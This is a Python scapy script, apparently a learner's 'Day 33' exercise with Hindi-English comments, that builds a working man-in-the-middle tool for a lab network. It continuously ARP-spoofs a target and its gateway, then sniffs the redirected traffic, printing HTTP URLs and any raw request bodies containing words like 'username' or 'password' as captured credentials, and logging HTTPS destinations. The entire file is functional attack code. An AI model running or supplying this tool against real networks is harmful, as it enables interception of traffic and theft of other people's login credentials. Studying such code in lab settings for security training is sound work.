import scapy.all as scapy
from scapy.layers import http
import time
import threading

# ==========================================
# PART 1: ARP SPOOFER (Rasta Badalna)
# ==========================================
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

def start_spoofer(target_ip, gateway_ip):
    print(f"[+] Spoofer Thread Started targeting {target_ip}...")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)

# ==========================================
# PART 2: PACKET SNIFFER (Data Padna)
# ==========================================
def process_sniffed_packet(packet):
    # 1. Check for Unsecure HTTP (Port 80)
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] HTTP (Unsecure) Request >> {url.decode()}")
        
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "password", "pass", "uname", "pwd"]
            for keyword in keywords:
                if keyword in load:
                    print(f"\n\n[!] Possible Credentials > {load}\n\n")

    # 2. Check for Encrypted HTTPS (Port 443) - WITH ERROR HANDLING
    elif packet.haslayer(scapy.TCP) and (packet[scapy.TCP].dport == 443 or packet[scapy.TCP].sport == 443):
        
        # Agar packet normal IPv4 hai (jaise 10.0.2.15)
        if packet.haslayer(scapy.IP):
            print(f"[*] Detected HTTPS (IPv4) Traffic to >> {packet[scapy.IP].dst}")
            
        # Agar packet naya IPv6 hai (jaise fe80::...)
        elif packet.haslayer(scapy.IPv6):
            print(f"[*] Detected HTTPS (IPv6) Traffic to >> {packet[scapy.IPv6].dst}")

def start_sniffer(interface):
    print(f"[+] Sniffer Thread Started on {interface}...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# ==========================================
# PART 3: MAIN FRAMEWORK (Multithreading)
# ==========================================
TARGET_IP = "10.0.2.2"   # Gateway IP 
GATEWAY_IP = "10.0.2.1"  # Fake IP
INTERFACE = "eth0"       

print("[*] Initializing Day 33 MITM Framework (Robust Edition)...")

try:
    spoofer_thread = threading.Thread(target=start_spoofer, args=(TARGET_IP, GATEWAY_IP))
    spoofer_thread.daemon = True 
    spoofer_thread.start()

    start_sniffer(INTERFACE)

except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C ... Shutting down Framework.")
